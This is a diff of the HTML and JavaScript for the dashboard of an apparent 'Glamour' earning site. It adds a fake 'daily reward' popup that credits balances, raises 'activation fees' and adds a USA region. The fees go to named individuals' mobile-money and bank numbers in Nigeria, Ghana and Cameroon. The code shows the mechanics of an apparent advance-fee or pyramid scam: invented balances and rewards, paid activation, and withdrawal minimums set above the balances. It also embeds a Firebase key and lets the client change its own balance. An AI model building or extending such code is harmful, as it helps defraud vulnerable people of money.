@@ -289,15 +289,29 @@
         </div>
     </div>
 
+    <!-- Activity Reward Popup -->
+    <div id="activityPopup" class="popup-overlay">
+        <div class="bg-zinc-950 border border-zinc-900 rounded-[45px] w-full max-w-sm p-10 text-center shadow-2xl scale-90 transition-all duration-300" id="activityCard">
+            <div class="w-16 h-16 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i class="fas fa-gift gold-text text-3xl"></i>
+            </div>
+            <h2 class="gold-text text-2xl font-black italic mb-2 uppercase">Daily Activity</h2>
+            <p id="activityValue" class="text-white text-3xl font-black mb-4 tracking-tighter">...</p>
+            <p class="text-zinc-600 text-[10px] font-black uppercase tracking-[0.2em] mb-10 leading-relaxed">
+                Your daily elite engagement reward has been credited to your portfolio.
+            </p>
+            <button onclick="closeActivityPopup()" class="activate-gradient w-full py-5 rounded-[22px] text-[11px] uppercase tracking-widest shadow-2xl active:scale-95">
+                Collect Reward
+            </button>
+        </div>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // --- FIREBASE CONFIG ---
-        // Ensuring compatibility with the environment's provided settings if available, 
-        // otherwise using your hardcoded values.
         const firebaseConfig = {
-            apiKey: "", 
+            apiKey: "AIzaSyC550tYO2IYMUtusP8DsizX93ptKHa1JQs", 
             authDomain: "glamour-76f78.firebaseapp.com",
             projectId: "glamour-76f78",
             storageBucket: "glamour-76f78.firebasestorage.app",
@@ -308,7 +322,6 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // --- LOCAL STATE ---
         const currentUsername = localStorage.getItem('glamour_username') || "EliteGuest";
         let globalAdminSettings = {
             bankName: "PALMPAY",
@@ -321,49 +334,45 @@
         document.getElementById('userDisplay').innerText = "@" + currentUsername;
         document.getElementById('refLink').value = window.location.origin + "/index.html?ref=" + currentUsername;
 
-        // 1. LISTEN TO GLOBAL SETTINGS (ADMIN DASHBOARD DATA)
-        // Path matches the requirement: /artifacts/{appId}/public/data/settings/global
-        const appId = "default-app-id"; // Adjust if your appId varies
+        const appId = "default-app-id";
         const settingsDocRef = doc(db, 'artifacts', appId, 'public', 'data', 'settings', 'global');
         
         onSnapshot(settingsDocRef, (snapshot) => {
             if (snapshot.exists()) {
                 globalAdminSettings = snapshot.data();
-                // Refresh the UI with new admin data if user doc already loaded
-                const userDocRef = doc(db, 'users', currentUsername);
-                // We re-trigger the sync logic
             }
         });
 
-        // 2. LISTEN TO USER DATA
         const userDocRef = doc(db, 'users', currentUsername);
         onSnapshot(userDocRef, (snapshot) => {
             if (snapshot.exists()) {
                 const data = snapshot.data();
                 syncCurrencyAndBalance(data.country || "Nigeria", data);
-            } else {
-                syncCurrencyAndBalance("Nigeria", { balance: 10000 });
+                checkDailyActivity(data);
             }
         });
 
         function syncCurrencyAndBalance(country, userData) {
-            let symbol = "₦", bonus = 10000, fee = "₦14,000", tickerText = "", bankHtml = "";
+            let symbol = "₦", fee = "₦14,000", tickerText = "", bankHtml = "";
 
-            // Use Admin Settings for Nigeria, but override if country is different
             if(country === "Ghana") {
-                symbol = "GHS "; bonus = 120; fee = "180 GHS";
-                tickerText = "MINIMUM WITHDRAWAL: 250 GHS • GHANA REGION ONLINE • ACTIVATION: 180 GHS";
+                symbol = "GHS "; fee = "220 GHS";
+                tickerText = "MINIMUM WITHDRAWAL: 350 GHS • GHANA REGION ONLINE • ACTIVATION: 220 GHS";
                 bankHtml = createBankRow("Momo Network", "MTN Mobile Money", "Elite Merchant Number", "0247637488", "Account Holder", "Priscilla D. Gyamfi");
             } 
             else if(country === "Cameroon") {
-                symbol = "XAF "; bonus = 5400; fee = "7,500 XAF";
-                tickerText = "MINIMUM WITHDRAWAL: 12,000 XAF • CAMEROON REGION ONLINE • ACTIVATION: 7,500 XAF";
+                symbol = "XAF "; fee = "13,000 XAF";
+                tickerText = "MINIMUM WITHDRAWAL: 20,000 XAF • CAMEROON REGION ONLINE • ACTIVATION: 13,000 XAF";
                 bankHtml = createBankRow("Momo Network", "MTN MOMO", "Elite Merchant Number", "680545817", "Account Holder", "Chanceline Nwana");
             }
+            else if(country === "USA") {
+                symbol = "$"; fee = "8.00 USD";
+                tickerText = "MINIMUM WITHDRAWAL: $15.00 • USA REGION ONLINE • ACTIVATION: $8.00";
+                bankHtml = createBankRow("Wire Transfer", "Crypto / CashApp", "Payment ID", "Contact Admin", "Corporate Name", "Glamour Global LLC");
+            }
             else {
-                symbol = "₦"; bonus = 10000; fee = "₦14,000";
+                symbol = "₦"; fee = "₦14,000";
                 tickerText = "MINIMUM WITHDRAWAL: ₦20,000 • NIGERIA REGION ONLINE • ACTIVATION: ₦14,000";
-                // NIGERIA USES DYNAMIC ADMIN SETTINGS
                 bankHtml = createBankRow(
                     "Elite Bank", globalAdminSettings.bankName || "PALMPAY",
                     "Capital Identifier", globalAdminSettings.accountNumber || "9013801817",
@@ -371,16 +380,34 @@
                 );
             }
 
-            document.getElementById('mainBalance').innerText = symbol + (userData.balance || bonus).toLocaleString();
+            document.getElementById('mainBalance').innerText = symbol + (userData.balance || 0).toLocaleString();
             document.getElementById('indirectIncome').innerText = symbol + (userData.indirectEarnings || 0).toLocaleString();
             document.getElementById('countryDisplay').innerText = country.toUpperCase() + " REGION";
             document.getElementById('feeLabel').innerText = "Activation Fee: " + fee;
             document.getElementById('bankDetails').innerHTML = bankHtml;
             document.getElementById('dynamicTicker').innerText = tickerText + " • SYSTEM ONLINE • NO OPAY";
+        }
 
-            // If admin set a redirect link, we could handle that here if needed
-            if (globalAdminSettings.redirectLink && globalAdminSettings.redirectLink !== window.location.href) {
-                // Optional: handle redirects or display a banner
+        async function checkDailyActivity(userData) {
+            const lastActivity = userData.lastActivityDate;
+            const today = new Date().toISOString().split('T')[0];
+
+            if (lastActivity !== today) {
+                let reward = 1000;
+                let symbol = "₦";
+                
+                if(userData.country === "Ghana") { symbol = "GHS "; reward = 15; }
+                else if(userData.country === "Cameroon") { symbol = "XAF "; reward = 500; }
+                else if(userData.country === "USA") { symbol = "$"; reward = 0.50; }
+
+                document.getElementById('activityValue').innerText = "+" + symbol + reward.toLocaleString();
+                document.getElementById('activityPopup').style.display = 'flex';
+                
+                // Update Firebase immediately
+                await updateDoc(userDocRef, {
+                    balance: increment(reward),
+                    lastActivityDate: today
+                });
             }
         }
 
@@ -393,7 +420,7 @@
                 <div class="pb-3 border-b border-zinc-900 relative group">
                     <p class="text-[8px] text-zinc-600 font-bold uppercase mb-1">${label2}</p>
                     <div class="flex items-center justify-between">
-                        <p class="text-xl font-black gold-text tracking-widest" id="targetAcc">${val2}</p>
+                        <p class="text-xl font-black gold-text tracking-widest">${val2}</p>
                         <button onclick="copyToClipboard('${val2}')" class="bg-zinc-800 p-2 rounded-lg text-[8px] font-black text-white hover:bg-zinc-700 active:scale-90 transition-all uppercase">Copy</button>
                     </div>
                 </div>
@@ -404,7 +431,6 @@
             `;
         }
 
-        // --- GLOBAL WINDOW FUNCTIONS ---
         window.openActivation = () => {
             document.getElementById('paymentInitial').classList.remove('hidden');
             document.getElementById('paymentVerifying').classList.add('hidden');
@@ -413,6 +439,10 @@
         
         window.closeActivation = () => document.getElementById('activationPopup').style.display = 'none';
         
+        window.closeActivityPopup = () => {
+            document.getElementById('activityPopup').style.display = 'none';
+        };
+
         window.startVerification = () => {
             document.getElementById('paymentInitial').classList.add('hidden');
             document.getElementById('paymentVerifying').classList.remove('hidden');
